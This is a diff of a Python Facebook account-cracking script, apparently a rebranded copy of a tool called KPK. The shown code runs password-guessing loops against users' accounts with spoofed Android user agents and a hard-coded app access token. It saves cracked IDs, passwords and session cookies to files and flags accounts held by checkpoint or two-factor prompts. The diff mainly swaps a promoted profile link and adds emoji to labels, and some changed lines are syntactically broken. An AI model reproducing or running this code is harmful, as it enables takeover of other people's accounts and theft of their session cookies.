@@ -13,7 +13,7 @@ except ModuleNotFoundError:
     os.system('pip install requests bs4 futures==2 > /dev/null')
     os.system('python KPK.py')
 	
-os.system('xdg-open https://www.facebook.com/Raja.zakaryia')
+os.system('xdg-open https://www.facebook.com/zafarjaan.baloch.7923
 
 try:
     prox= requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text
@@ -145,7 +145,7 @@ device = {
         'fbsv':fbsv,
         'fbca':fbca,
         'fbdm':fbdm}
-os.system('xdg-open https://www.facebook.com/Raja.zakaryia')
+os.system('xdg-open https://www.facebook.com/zafarjaan.baloch.7923
 ##______COLORS____ARE________######
 pwx=[]
 W = '\033[97;1m'
@@ -315,7 +315,7 @@ def pak():
 def ffb(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [K-P-K-] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [K🧚‍♀️P🧚‍♀️K -] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -366,26 +366,26 @@ def ffb(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [-K-P-K-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [-K🧚‍♀️P🧚‍♀️K -OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/K-P-K-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/K-P-K-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/K🧚‍♀️P🧚‍♀️K -COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/K🧚‍♀️P🧚‍♀️K -OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[K-P-K-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[K🧚‍♀️P🧚‍♀️K -2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;31m [ALONE-K-P-K-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/K-P-K-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[1;31m [ALONE-K🧚‍♀️P🧚‍♀️K -CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/K🧚‍♀️P🧚‍♀️K -CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/K-P-K-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/K🧚‍♀️P🧚‍♀️K -CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -397,7 +397,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [K-P-K- ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [K🧚‍♀️P🧚‍♀️K - ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -432,7 +432,7 @@ def api(ids,names,passlist):
                         mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua  = '[FBAN/FB4A;FBAV/60.0.0.16.258;FBBV/20100100;FBDM/({density=2.0,width=720,height=1280};FBLC/en_US;FBCR/T-Mobile;FBMF/Google;FBBD/Pixel;FBPN/com.facebook.katana;FBDV/Nexus 5X;FBSV/8.1.0;nullFBCA/armeabi-v7a;]
+                        ua  = '[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/({density=1.5,width=480,height=800};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/({density=1.5,width=480,height=800};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/*{density=4.0,width=1440,eight=2560};FBLC/en_US;FBCR/3.;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+mmp+';FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi:;]'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -489,23 +489,23 @@ def api(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [-K-P-K-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/K-P-K-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [-K🧚‍♀️P🧚‍♀️K -OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/K🧚‍♀️P🧚‍♀️K -OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[K-P-K-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[K🧚‍♀️P🧚‍♀️K -2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;31m [ALONE-K-P-K-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/K-P-K-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[1;31m [ALONE-K🧚‍♀️P🧚‍♀️K -CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/K🧚‍♀️P🧚‍♀️K -CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/K-P-K-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/K🧚‍♀️P🧚‍♀️K -CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -516,7 +516,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [K-P-K-] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [K🧚‍♀️P🧚‍♀️K -] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -540,7 +540,7 @@ def api1(ids,names,passlist):
                         en = random.choice(['en_US','en_GB'])
                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua  = "[FBAN/FB4A;FBAV/60.0.0.16.258;FBBV/20100100;FBDM/({density=2.0,width=720,height=1280};FBLC/en_US;FBCR/T-Mobile;FBMF/Google;FBBD/Pixel;FBPN/com.facebook.katana;FBDV/Nexus 5X;FBSV/8.1.0;nullFBCA/armeabi-v7a;]
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM({density=1.0,width=600,height=976};FBLC/es_LA;FBCR/MOVISTAR;FBMF/Rockchip;FBBD/K5-3G;FBPN/com.facebook.katana;FBDV/K5-3G;FBSV/5.1.1;nullFBCA/x86:armeabi-v7a;]"
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -589,11 +589,11 @@ def api1(ids,names,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [-K-P-K-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [-K🧚‍♀️P🧚‍♀️K -OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/K-P-K-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/K-P-K-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/K🧚‍♀️P🧚‍♀️K -COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/K🧚‍♀️P🧚‍♀️K -rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -603,8 +603,8 @@ def api1(ids,names,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                    #    print('\r\r\x1b[1;31m [K-P-K-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/K-P-K-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                    #    print('\r\r\x1b[1;31m [K🧚‍♀️P🧚‍♀️K -CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/K🧚‍♀️P🧚‍♀️K -rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -615,7 +615,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [K-P-K-] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [K🧚‍♀️P🧚‍♀️K -] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -672,11 +672,11 @@ def rndm(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [-K-P-K-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [-K🧚‍♀️P🧚‍♀️K -OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/K-P-K-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/K-P-K-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/K🧚‍♀️P🧚‍♀️K -COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/K🧚‍♀️P🧚‍♀️K -OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -686,8 +686,8 @@ def rndm(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[1;31m [K-P-K-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/K-P-K-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[1;31m [K🧚‍♀️P🧚‍♀️K -CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/K🧚‍♀️P🧚‍♀️K -rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
